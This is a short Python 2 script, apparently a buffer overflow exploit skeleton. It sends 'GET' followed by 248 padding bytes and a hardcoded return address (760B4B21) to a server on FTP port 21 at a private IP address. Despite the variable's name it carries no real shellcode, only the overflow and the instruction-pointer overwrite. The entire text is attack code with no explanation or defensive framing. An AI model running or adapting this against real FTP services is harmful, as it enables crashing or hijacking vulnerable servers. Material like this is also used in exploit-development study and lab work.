#!/bin/python
import sys, socket

"Ret address=>760B4B21"	

eob="\r\n\r\n"
Shellcode = "A" * 248 + "\x21\x4b\x0b\x76"
try: 
             s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
             s.connect(('192.168.1.133',21))
             print "Sending data to remove server....."
             s.send(('GET' + Shellcode + eob))
             s.close()
           


except: 
               print("Error in connecting")
               sys.exit()   